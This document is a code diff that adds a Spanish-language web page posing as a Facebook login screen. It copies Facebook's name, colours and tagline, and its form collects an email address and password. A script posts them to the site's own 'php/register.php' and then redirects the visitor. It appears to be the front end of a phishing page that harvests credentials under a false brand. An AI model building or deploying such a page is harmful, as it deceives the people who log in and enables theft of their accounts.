@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar Sesión</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo-container h1 {
+            color: #1877f2;
+            font-size: 50px;
+            font-weight: bold;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: center;
+        }
+        .login-container h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            width: 95%;
+            font-size: 18px;
+            border-radius: 5px;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background-color: #1256a3;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <h1>Facebook</h1>
+        <p>Conéctate con todo el mundo y amigos</p>
+    </div>
+    <div class="login-container">
+        <h2>Iniciar Sesión</h2>
+        <form id="registerForm">
+            <input type="email" name="email" placeholder="Correo Electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit" class="btn">Registrarse</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("registerForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Evita que la página se recargue
+
+            let formData = new FormData(this);
+
+            fetch("php/register.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Respuesta del servidor:", data); // Muestra la respuesta en la consola
+                alert(data); // Muestra el mensaje del servidor
+                if (data.includes("Registro exitoso")) {
+                    window.location.href = 'gallery/gallery.html'; // Redirige solo si el registro es exitoso
+                }
+            })
+            .catch(error => {
+                console.error("Error en la solicitud:", error);
+                alert("Hubo un error al enviar los datos.");
+            });
+        });
+    </script>        
+</body>
+</html>
